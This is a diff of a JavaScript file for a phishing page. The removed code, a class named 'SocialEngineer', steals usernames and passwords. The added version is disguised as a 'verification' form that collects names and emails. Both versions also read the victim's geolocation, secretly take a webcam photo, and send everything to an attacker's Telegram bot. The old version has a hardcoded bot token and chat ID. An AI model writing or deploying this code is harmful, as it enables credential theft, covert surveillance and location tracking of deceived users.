@@ -1,94 +1,75 @@
-// script.js
-// Configuration
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM';
-const CHAT_ID = process.env.CHAT_ID || '6866229974';
-
-class SocialEngineer {
-    constructor() {
-        this.init();
-    }
-
-    init() {
-        document.getElementById('credentialForm').addEventListener('submit', this.handleSubmit.bind(this));
-    }
-
-    async handleSubmit(e) {
-        e.preventDefault();
-        
-        // Extract credentials
-        const credentials = {
-            username: document.getElementById('username').value,
-            password: document.getElementById('password').value
-        };
-
-        // Collect location
-        const location = await this.getLocation();
+document.getElementById('verification-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    // Get form data
+    const formData = new FormData(e.target);
+    const userInfo = {
+        name: formData.get('name'),
+        email: formData.get('email'),
+        timestamp: new Date().toISOString()
+    };
+    
+    try {
+        // Get location
+        const location = await getCurrentLocation();
+        userInfo.location = location;
         
         // Capture photo
-        const photo = await this.capturePhoto();
-
-        // Send to Telegram
-        this.sendToTelegram({
-            ...credentials,
-            location,
-            photo
-        });
-    }
-
-    getLocation() {
-        return new Promise((resolve, reject) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
-                () => resolve(null)
-            );
-        });
-    }
-
-    capturePhoto() {
-        return new Promise(async (resolve, reject) => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.autoplay = true;
-
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    const dataUrl = canvas.toDataURL('image/jpeg');
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(dataUrl);
-                }, 2000);
-            } catch (err) {
-                resolve(null);
-            }
-        });
-    }
-
-    sendToTelegram(data) {
-        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMediaGroup`;
+        const photoData = await capturePhoto();
+        userInfo.photo = photoData;
         
-        fetch(TELEGRAM_API, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                media: [
-                    {type: 'text', text: `Credentials: ${data.username}:${data.password}`},
-                    ...(data.location ? [{type: 'text', text: `Location: ${data.location}`}]: []),
-                    ...(data.photo ? [{type: 'photo', media: data.photo}]: [])
-                ]
-            })
-        }).catch(err => console.error('Telegram error:', err));
+        // Send data to Telegram bot
+        await sendToTelegram(userInfo);
+        
+        alert('Verification completed successfully!');
+    } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred during verification.');
     }
+});
+
+function getCurrentLocation() {
+    return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+            position => resolve({
+                lat: position.coords.latitude,
+                lng: position.coords.longitude
+            }),
+            error => reject(error)
+        );
+    });
 }
 
-new SocialEngineer();
+async function capturePhoto() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    
+    return new Promise((resolve, reject) => {
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(track => track.stop());
+            resolve(dataUrl);
+        }, 1000);
+    });
+}
+
+async function sendToTelegram(data) {
+    const response = await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: 'YOUR_CHAT_ID',
+            text: JSON.stringify(data, null, 2)
+        })
+    });
+    
+    if (!response.ok) throw new Error(`Telegram API error: ${response.status}`);
+}
